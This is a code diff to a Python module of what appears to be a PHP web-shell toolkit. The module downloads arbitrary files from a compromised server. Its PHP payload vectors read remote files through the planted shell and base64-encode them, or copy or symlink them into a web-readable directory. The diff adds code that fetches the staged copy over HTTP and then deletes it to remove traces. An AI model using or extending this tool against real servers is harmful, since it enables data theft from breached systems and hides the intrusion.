@@ -4,6 +4,7 @@ Created on 24/ago/2011
 @author: norby
 '''
 from core.module import Module, ModuleException
+from core.http.request import Request
 from base64 import b64decode
 from hashlib import md5
 
@@ -19,9 +20,9 @@ class Download(Module):
                      }
     
     vectors = { 'shell.php' : { 
-                               "file()"             : "print(base64_encode(implode('', file('%s'))));",
-                               "fread()"            : "$f='%s'; print(base64_encode(fread(fopen($f,'rb'),filesize($f))));",
-                                "file_get_contents()"     : "print(base64_encode(file_get_contents('%s')));",
+                               "file()"             : "print(@base64_encode(implode('', file('%s'))));",
+                               "fread()"            : "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
+                                "file_get_contents()"     : "print(@base64_encode(file_get_contents('%s')));",
                                 "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
                                 "symlink()"     : "@symlink('%s','%s/file.txt'); file_exists('%s/file.txt') && print(1);"
                                 },
@@ -40,7 +41,8 @@ class Download(Module):
         self.payload = None
         self.vector = None
         self.interpreter = None
-        self.writable_dir = None
+        self.transfer_dir = None
+        self.transfer_url_dir = None
         
         
         Module.__init__(self, modhandler, url, password)
@@ -54,7 +56,7 @@ class Download(Module):
             print '[file.download] PHP \'base64_encode()\' transfer methods not available.'
             
         if self.modhandler.load('shell.php').run("is_callable('md5_file') && print('1');") == '1':
-            self.md5_callable = 1
+            self.md5_callable = True
         else:
             print '[file.download] PHP \'md5_file()\' file correctness check not available.'
             
@@ -72,12 +74,12 @@ class Download(Module):
                         
                     if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 3:
                         
-                        if not self.writable_dir:
-                            doc_root = self.modhandler.load('system.info').run('document_root')
-                            writable_dir = self.modhandler.load('find.perms').run('first', 'dir', 'w', doc_root)
-                            self.writable_dir = writable_dir
+                        if not (self.transfer_dir and self.transfer_url_dir):
+                            
+                            self.transfer_url_dir = self.modhandler.load('find.webdir').url
+                            self.transfer_dir = self.modhandler.load('find.webdir').dir
                         
-                        payload = payload % (remote_path, writable_dir, writable_dir)
+                        payload = payload % (remote_path, self.transfer_dir, self.transfer_dir)
                         
                     response = self.modhandler.load(interpreter).run(payload)
                     
@@ -94,35 +96,42 @@ class Download(Module):
      
     def __process_response(self,response, remote_path, local_path):
         
-        
         if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
-            print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % self.writable_dir
+            url = self.transfer_url_dir + '/file.txt'
+            file_path = self.transfer_dir + '/file.txt'
+            
+            print "[file.download] Reading file via \'%s\' and removing" % url
+            
+            response = Request(url).read()
+            
+            if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % file_path) != '1':
+                print "[!] [find.download] Error cleaning support file %s" % (file_path)
+            
         else:
-            
             if self.encoder_callable:
-                
-                response_decoded = b64decode(response)
-                
-                try:
-                    f = open(local_path,'wb')
-                    f.write(response_decoded)
-                    f.close()
-                except Exception, e:
-                    print '[!] [file.download] Some error occurred writing local file \'%s\'.' % local_path
-                    raise ModuleException('[file.download]', e)
-                else:
-                    print '[file.download] File downloaded to \'%s\' using method \'%s\'' % (local_path, self.vector)
-                
+                response = b64decode(response)
             
-    
-            if self.md5_callable:
-                response_md5 = md5(response_decoded).hexdigest()
-                if self.modhandler.load('shell.php').run("print(md5_file('%s'));" % remote_path) == response_md5:
-                    print '[file.download] MD5 hash of \'%s\' match.' % local_path
-                else:
-                    print '[!] [file.download] MD5 hash of \'%s\' file mismatch, file corrupted.' % local_path
-
+            
+                
+        try:
+            f = open(local_path,'wb')
+            f.write(response)
+            f.close()
+        except Exception, e:
+            print '[!] [file.download] Some error occurred writing local file \'%s\'.' % local_path
+            raise ModuleException('[file.download]', e)
+        else:
+            print '[file.download] File downloaded to \'%s\' using method \'%s\'' % (local_path, self.vector)
         
+
+        if self.md5_callable:
+            response_md5 = md5(response).hexdigest()
+            if self.modhandler.load('shell.php').run("print(md5_file('%s'));" % remote_path) == response_md5:
+                print '[file.download] MD5 hash of \'%s\' match.' % local_path
+            else:
+                print '[!] [file.download] MD5 hash of \'%s\' file mismatch, file corrupted.' % local_path
+
+
      
     def run(self, remote_path, local_path):
         
